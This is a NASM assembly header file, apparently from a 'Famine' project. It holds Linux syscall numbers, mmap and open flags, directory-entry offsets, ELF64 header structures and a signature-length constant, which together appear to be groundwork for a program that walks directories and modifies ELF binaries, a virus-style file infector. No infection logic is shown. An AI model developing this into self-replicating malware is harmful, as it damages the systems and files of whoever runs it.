%define		SIG_LEN			0x2b

; SYSCALL
%define     SYS_EXIT        60
%define     SYS_OPEN        2
%define     SYS_GETDENTS    217
%define     SYS_CLOSE       3
%define		SYS_LSEEK		8
%define		SYS_MMAP		9

; MMAP
%define		PROT_EXEC		1
%define		PROT_READ		2
%define		PROT_WRITE		4
%define		MAP_SHARED		1

; OPEN
%define		O_RDONLY			0x0000
%define		O_WRONLY			0x0001
%define		O_RDWR				0x0002
%define		O_DIRECTORY			0q0200000

; DIRENT
%define		D_INO_OFF			0x00
%define		D_OFF_OFF			0x08
%define		D_RECLEN_OFF		0x10
%define		D_TYPE  			0x12
%define		D_NAME  			0x13
%define     D_REG_FILE          0x8

; LSEEK
%define		SEEK_SET			0x0
%define		SEEK_END			0x2

%define     PAGE_SIZE           0x1000

%define		FAM(x)				[(rbp - famine_size) + x]
%define		CHF(x)				[(rbp - check_file_size) + x]

struc famine
    .dirents:           resb    PAGE_SIZE
    .total_read:        resd    1
    .total_to_read:     resd    1
    .dirents_struct_ptr resq    1
endstruc

struc check_file
	.file_fd:	resd	1
	.file_name:	resw	255
	.map:		resq	1
endstruc

; ELF structures
%define	PT_LOAD	0x1
struc	elf64_ehdr
	.e_ident:		resb	16
	.e_type:		resw	1
	.e_machine:		resw	1
	.e_version:		resd	1
	.e_entry:		resq	1
	.e_phoff:		resq	1
	.e_shoff:		resq	1
	.e_flags:		resd	1
	.e_ehsize:		resw	1
	.e_phentsize:	resw	1
	.e_phnum:		resw	1
	.e_shentsize:	resw	1
	.e_shnum:		resw	1
	.e_shstrndx:	resw	1
endstruc

struc	elf64_phdr
	.p_type:		resd	1
	.p_flags:		resd	1
	.p_offset:		resq	1
	.p_vaddr:		resq	1
	.p_paddr:		resq	1
	.p_filesz:		resq	1
	.p_memsz:		resq	1
	.p_align:		resq	1
endstruc

%macro writeWork 0
    mov rax, 1
    mov rdi, 1
    mov rsi, open
    mov rdx, 11
    syscall
%endmacro
